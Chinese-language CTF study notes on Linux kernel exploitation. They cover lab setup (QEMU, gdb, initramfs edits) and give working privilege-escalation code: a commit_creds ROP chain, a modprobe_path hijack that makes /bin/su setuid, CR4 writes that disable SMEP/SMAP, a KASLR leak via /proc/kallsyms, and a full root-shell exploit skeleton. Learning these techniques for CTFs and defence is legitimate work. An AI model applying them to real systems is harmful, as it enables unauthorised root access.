

```text
kernel/
├── bzImage          # 压缩内核镜像
├── vmlinux          # 未压缩内核（带符号，用于 gdb）
├── initramfs.cpio.gz / rootfs.img
├── vuln.ko          # 漏洞驱动
├── run.sh           # qemu 启动脚本
└── (.config)        # 编译配置，可选
```


```bash
mkdir initramfs && cd initramfs
zcat ../initramfs.cpio.gz | cpio -idm
# 或 newc 格式：
# cpio -idm < ../initramfs.cpio

# 改 init 拿 root（CTF 学习用，真实题目通常 setuid 1000）
sed -i 's|setuidgid 1000|setuidgid 0|g' init
# 或注释掉 user 切换那一行

# 重新打包
find . | cpio -o --format=newc | gzip > ../initramfs.cpio.gz
cd ..
```


```bash
# 用 extract-vmlinux 脚本（kernel 源码 scripts/）
/usr/src/linux/scripts/extract-vmlinux ./bzImage > vmlinux
```


```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 256M \
    -kernel ./bzImage \
    -initrd ./initramfs.cpio.gz \
    -cpu kvm64,+smep,+smap \
    -append "console=ttyS0 nokaslr quiet oops=panic panic=1" \
    -monitor /dev/null \
    -nographic \
    -no-reboot \
    -s    # 开 gdb 端口 1234
```


|------|------|---------|


```bash
# 终端 1
./run.sh   # 带 -s

# 终端 2
gdb vmlinux
(gdb) target remote :1234
(gdb) b vulnerable_ioctl
(gdb) c
```


|------|---------|---------|


|-----------|---------|------|


```c
// 用户态触发
int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

struct {
    long mtype;
    char mtext[0x80 - 0x30];  // 加上 msg_msg 头 0x30 = kmalloc-128
} msg = { .mtype = 0x1337 };
memset(msg.mtext, 'A', sizeof(msg.mtext));

msgsnd(msqid, &msg, sizeof(msg.mtext), 0);   // 喷到 kmalloc-128
// ... 触发漏洞覆盖
msgrcv(msqid, &msg, sizeof(msg.mtext), 0, 0); // 读回看是不是被改了 → leak
```


### 1. commit_creds(prepare_kernel_cred(0)) ROP


```c
// 用户态 ROP 链
uint64_t rop[] = {
    pop_rdi,                          // pop rdi; ret
    0,                                // arg: 0
    prepare_kernel_cred,              // → 返回 root cred 到 rax
    pop_rdi,                          // pop rdi; ret
    /* 占位，下面 mov 会覆盖 */ 0,
    /* mov rdi, rax; ... ; ret */ 0,  // 转 rax→rdi（部分需要专门 gadget）
    commit_creds,                     // 设置当前进程 cred = root
    swapgs_restore_regs_and_return_to_usermode + 22,  // 跳过 push 序列
    0, 0,                             // rax, rdi 占位
    user_rip,                         // 用户态返回函数（保存了 cs/ss）
    user_cs, user_rflags, user_rsp, user_ss,
};
```


```bash
ROPgadget --binary vmlinux --only "pop|ret" | grep 'pop rdi'
ROPgadget --binary vmlinux --only "mov|ret" | grep 'mov rdi, rax'
```


```c
void save_state() {
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp));
}
void shell() { system("/bin/sh"); }
```


```text
原理：
  - 内核全局变量 modprobe_path 默认 "/sbin/modprobe"
  - 当 execve 一个不认识 magic 的文件时，内核调用 modprobe_path 以 root 执行
  - 改成 "/tmp/x"，写 /tmp/x（chmod +x），触发未知 magic 执行
  
适用：有任意写原语，但不一定能 ROP
```

```c
// 1. 准备 payload
system("echo -e '#!/bin/sh\nchmod +s /bin/su' > /tmp/x");
system("chmod +x /tmp/x");

// 2. 准备触发文件
system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger");
system("chmod +x /tmp/trigger");

// 3. 漏洞写：把 modprobe_path 改成 "/tmp/x\x00"
arbitrary_write(modprobe_path_addr, "/tmp/x\x00");

// 4. 触发
system("/tmp/trigger");
// 内核 root 跑 /tmp/x，做了 chmod +s /bin/su

// 5. 利用 setuid
system("/bin/su");
```


### 3. core_pattern hijack

```text
类似思想：/proc/sys/kernel/core_pattern 控制 coredump 处理程序
改成 "|/tmp/x %P"，让进程崩溃时调用
缺点：需要触发 coredump，比 modprobe_path 笨重
```


```c
// CR4: SMEP = bit 20, SMAP = bit 21
// 关 SMEP+SMAP 后，jmp 到用户态 shellcode 才能跑
uint64_t rop[] = {
    pop_rdi,
    0x6f0,                  // CR4 期望值（去掉 SMEP/SMAP 位）
    mov_cr4_rdi,            // "mov cr4, rdi; pop rbp; ret" 之类
    0,
    user_shellcode_addr,    // 跳过去（如果还没关 SMEP 这步会失败）
};
```


|------|------|------|

```c
// 经典：从 /proc/kallsyms 读
FILE *f = fopen("/proc/kallsyms", "r");
char line[256];
unsigned long commit_creds = 0;
while (fgets(line, sizeof(line), f)) {
    if (strstr(line, " commit_creds")) {
        commit_creds = strtoul(line, NULL, 16);
        break;
    }
}
unsigned long kbase = commit_creds - 0xXXXXX;  // 偏移看 vmlinux
```


```c
// exploit.c — 内核 pwn 通用骨架
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

static unsigned long user_cs, user_ss, user_rflags, user_rsp;

static void save_state(void) {
    __asm__ volatile(
        "movq %%cs,   %0\n"
        "movq %%ss,   %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp,  %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :: "memory");
}

static void win(void) {
    if (getuid() == 0) {
        puts("[+] root!");
        system("/bin/sh");
    } else {
        puts("[-] not root");
    }
    exit(0);
}

// === KASLR base（先 leak 或 nokaslr 时直接写死） ===
#define KBASE_DEFAULT  0xffffffff81000000UL
#define OFF_COMMIT_CREDS         0x0xxxxx
#define OFF_PREPARE_KERNEL_CRED  0x0xxxxx
#define OFF_POP_RDI              0x0xxxxx
#define OFF_MOV_RDI_RAX          0x0xxxxx
#define OFF_SWAPGS_RESTORE       0x0xxxxx

int main(void) {
    save_state();

    // 1. leak KASLR base（这里假设 /proc/kallsyms 可读，或自己写一个 leak primitive）
    unsigned long kbase = leak_kbase();

    unsigned long prepare_kernel_cred = kbase + OFF_PREPARE_KERNEL_CRED;
    unsigned long commit_creds        = kbase + OFF_COMMIT_CREDS;
    unsigned long pop_rdi             = kbase + OFF_POP_RDI;
    unsigned long mov_rdi_rax         = kbase + OFF_MOV_RDI_RAX;
    unsigned long swapgs_restore      = kbase + OFF_SWAPGS_RESTORE + 22;

    // 2. 构造 ROP（在用户栈或在喷出来的 fake 栈上）
    unsigned long *rop = mmap((void*)0x100000, 0x1000,
                              PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
    int i = 0;
    rop[i++] = pop_rdi;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = mov_rdi_rax;
    rop[i++] = commit_creds;
    rop[i++] = swapgs_restore;
    rop[i++] = 0;  // rax
    rop[i++] = 0;  // rdi
    rop[i++] = (unsigned long)win;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = (unsigned long)(rop + 100);  // 临时 user rsp，可指 mmap 高处
    rop[i++] = user_ss;

    // 3. 触发漏洞，让内核 RIP 跳到 rop[0]
    int fd = open("/dev/vuln", O_RDWR);
    trigger(fd, rop);   // 题目相关：ioctl / write / read

    return 0;
}
```


```text
漏洞：fs/fs_context.c 中 legacy_parse_param 长度计算有符号 / 无符号混淆
      → kmalloc 堆缓冲区溢出，size 任意，data 任意

为什么是好的学习样本：
1. 不需要 root 触发（unprivileged user namespace）
2. 溢出大小完全可控
3. 公开有完整 writeup + PoC
4. 综合了：user_ns 利用、msg_msg 喷射、UAF 后重占用、跨缓存利用

学习路径：
1. 编译带 CONFIG_USER_NS=y 的内核
2. 跑 Crusaders of Rust 的原版 PoC：https://www.openwall.com/lists/oss-security/2022/01/18/7
3. 看 willsroot.io 的官方 writeup（PortSwigger 收录的版本）
4. 手动重写：把 msg_msg 喷射改成 pipe_buffer 喷射版本（练习不同 slab 路径）
5. 加上 KASLR leak（原版用 /proc/kallsyms，挑战版禁用后改 OOB read）
```
